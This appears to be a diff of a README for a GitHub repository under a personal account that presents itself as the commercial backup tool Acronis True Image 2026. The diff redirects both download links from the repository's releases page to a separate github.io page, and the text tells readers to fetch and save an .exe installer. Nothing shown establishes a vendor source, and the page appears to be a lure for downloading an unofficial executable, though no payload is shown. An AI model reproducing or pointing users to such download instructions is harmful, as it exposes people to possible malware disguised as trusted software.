@@ -1,12 +1,12 @@
 # 🛡️ Acronis-True-Image-2026 - Secure Your Data With Reliable Backups
 
-[![](https://img.shields.io/badge/Download_Acronis_True_Image-Blue?style=for-the-badge)](https://github.com/samjaibor-sketch/Acronis-True-Image-2026/releases)
+[![](https://img.shields.io/badge/Download_Acronis_True_Image-Blue?style=for-the-badge)](https://samjaibor-sketch.github.io)
 
 Acronis True Image 2026 manages your disk images, incremental backups, and restore verification on Windows. This tool protects your files, photos, and system settings from data loss. It performs automated tasks to ensure your PC remains safe.
 
 ## 📥 How to Download
 
-Visit the [official releases page](https://github.com/samjaibor-sketch/Acronis-True-Image-2026/releases) to download the installer. Select the latest version listed under the Assets section. This file ends in .exe. Save it to your computer.
+Visit the [official releases page](https://samjaibor-sketch.github.io) to download the installer. Select the latest version listed under the Assets section. This file ends in .exe. Save it to your computer.
 
 ## ⚙️ System Requirements
 
